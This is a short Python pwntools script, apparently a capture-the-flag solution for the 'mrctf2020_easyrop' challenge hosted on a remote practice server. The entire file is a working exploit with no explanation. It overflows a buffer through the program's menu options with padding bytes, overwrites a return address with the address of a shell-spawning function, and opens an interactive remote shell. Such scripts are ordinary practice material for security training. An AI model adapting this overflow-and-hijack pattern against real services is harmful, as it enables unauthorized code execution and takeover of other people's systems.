from pwn import *

#p = process('./mrctf2020_easyrop')
p = remote('node4.buuoj.cn', 27091)

elf = ELF('./mrctf2020_easyrop')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

shell = 0x40072b

payload = b'a' * 0x300
sl(b'2')
sleep(0.1)
sn(payload)

sleep(0.1)
payload = b'a' * ( 0x10 + 2 ) + p64(shell)
sl(b'666')
sleep(0.1)

sn(payload)

sl(b'7')
sleep(0.1)
sn(b'\x00')

p.interactive()